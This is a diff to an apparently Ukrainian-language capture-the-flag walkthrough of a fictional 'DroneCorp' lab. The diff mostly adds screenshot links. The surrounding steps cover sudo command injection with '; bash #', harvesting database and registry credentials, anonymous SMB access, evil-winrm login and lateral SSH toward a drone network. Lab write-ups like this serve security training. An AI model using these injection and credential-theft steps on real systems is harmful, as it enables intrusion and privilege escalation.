@@ -100,6 +100,8 @@ ssh -o HostKeyAlgorithms=+ssh-rsa operator@192.168.125.55
 flag{n1ce_t0_s33_y0u}
 ```
 
+![Flag_4 SSH login](image/flag04_ssh_login.png)
+
 **Flag:** `flag{n1ce_t0_s33_y0u}`
 
 ---
@@ -114,24 +116,22 @@ sudo -l
 ```
 Бачимо: `sudo -u commador /opt/dronecorp/tools/flight_log_export.py`
 
+![Flag_5 sudo -l](image/flag05_sudo_l.png)
+
 Прочитати скрипт — флаг у docstring:
 ```bash
 cat /opt/dronecorp/tools/flight_log_export.py
 ```
 
-```python
-"""
-DroneCorp — Flight Log Export Utility v1.2
-...
-# flag{Y0u_l1ke_privileges}
-"""
-```
+![Flag_5 script content](image/flag05_script_content.png)
 
 Зробити injection щоб отримати shell від commador:
 ```bash
 sudo -u commador /opt/dronecorp/tools/flight_log_export.py
 ```
 Ввести: `; bash #`
+
+![Flag_5 injection](image/flag05_injection.png)
 
 Тепер shell від `commador`.
 
@@ -145,6 +145,8 @@ sudo -u commador /opt/dronecorp/tools/flight_log_export.py
 ```bash
 cat /home/commador/scripts/backup_db.sh
 ```
+
+![Flag_6 backup_db.sh](image/flag06_backup_db.png)
 
 Знаходимо credentials для PostgreSQL:
 ```
@@ -175,18 +177,22 @@ psql -h 10.10.50.100 -U tech2 -d dronecorp_db
 \dt
 ```
 
+![Flag_7 tables](image/flag07_dt_tables.png)
+
 **Знайти флаг у system_config:**
 ```sql
 SELECT config_key, config_val FROM system_config;
 ```
-```
-telemetry_api_key | flag{0mg_RC3}
-```
+
+![Flag_7 system_config](image/flag07_system_config.png)
 
 **Знайти IP Windows Server через БД:**
 ```sql
 SELECT DISTINCT managed_by FROM software_licenses;
 ```
+
+![Flag_8 discover IP](image/flag08_discover_ip.png)
+
 → `DroneCorp IT (10.10.50.150)`
 
 ```sql
@@ -210,10 +216,14 @@ smbclient -L //10.10.50.150 -N
 ```
 Бачимо шар `Updates`.
 
+![Flag_8 SMB list](image/flag08_smb_list.png)
+
 **Підключитись анонімно:**
 ```bash
 smbclient //10.10.50.150/Updates -N
 ```
+
+![Flag_8 SMB connect](image/flag08_smb_connect.png)
 
 **Всередині smbclient:**
 ```
@@ -230,6 +240,8 @@ cat /tmp/deploy_update.ps1
 ```powershell
 # flag{sh4r3_1s_c4r3}
 ```
+
+![Flag_8 deploy script](image/flag08_deploy_script.png)
 
 **Flag:** `flag{sh4r3_1s_c4r3}`
 
@@ -249,6 +261,8 @@ sudo apt install -y libreadline-dev ruby-dev ruby-full && sudo gem install evil-
 evil-winrm -i 10.10.50.150 -u svc_deploy -p 'Deploy@2024!Drone'
 ```
 
+![Flag_9 WinRM connect](image/flag09_winrm_connect.png)
+
 **Прочитати admin notes — флаг там:**
 ```powershell
 type C:\ProgramData\DroneOps\admin_notes.txt
@@ -260,6 +274,8 @@ Path: C:\Program Files\Drone Corp\Update Agent\DroneUpdateAgent.exe
 
 Access log key: flag{unqu0ted_p4th_pwn}
 ```
+
+![Flag_9 admin notes](image/flag09_admin_notes.png)
 
 **Flag:** `flag{unqu0ted_p4th_pwn}`
 
@@ -278,6 +294,8 @@ ssh_password  REG_SZ    grayraven124
 flag_final    REG_SZ    flag{f0und_th3_k3ys}
 ```
 
+![Flag_10 registry](image/flag10_registry.png)
+
 **Flag:** `flag{f0und_th3_k3ys}`  
 **Отримано:** credentials для Update Server
 
@@ -286,6 +304,9 @@ flag_final    REG_SZ    flag{f0und_th3_k3ys}
 ## Flag_11 — SSH на Update Server
 
 **З Operator_station. Credentials з реєстру Windows Server (Flag_10):**
+
+![Flag_10/11 SSH Update Server](image/flag10_11_ssh_update.png)
+
 ```bash
 ssh grayraven@10.10.50.180
 ```
@@ -296,15 +317,38 @@ ssh grayraven@10.10.50.180
 cat ~/flag.txt
 ```
 
+![Flag_11 flag.txt](image/flag11_flag_txt.png)
+
 **Flag:** `flag{update_server_compromised}`
 
 ---
 
 ## Flag_12 — Знайти мережу дронів
 
-**На Update Server. Шукати в конфігах та логах:**
+**На Update Server. Перевірити bash history та конфіги:**
+```bash
+cat ~/.bash_history
+```
+
+![Flag_11 bash history](image/flag11_history.png)
+
+Бачимо `ping 10.10.10.40` — підказка щодо мережі дронів.
+
 ```bash
 ls /home/grayraven/
+ls drone-updates/docs/
+```
+
+![Flag_12 docs list](image/flag12_docs_list.png)
+
+```bash
+cat drone-updates/docs/fleet-inventory.txt
+cat drone-updates/docs/mavlink-port-matrix.txt
+```
+
+![Flag_12/15 files content](image/flag12_15_files.png)
+
+```bash
 grep -r "10.10.10" /home/grayraven/ 2>/dev/null
 ```
 
@@ -338,6 +382,12 @@ GCS знаходиться на `10.10.10.40`
 ## Flag_15 — Протокол зв'язку з дроном
 
 Стандартний протокол для БПЛА — MAVLink (дослідити документацію PX4 / ArduPilot).
+
+```bash
+cat drone-updates/docs/mavlink-protocol-overview.txt
+```
+
+![Flag_15 MAVLink protocol](image/flag15_mavlink_protocol.png)
 
 **Flag:** `flag{mavlink}`
 
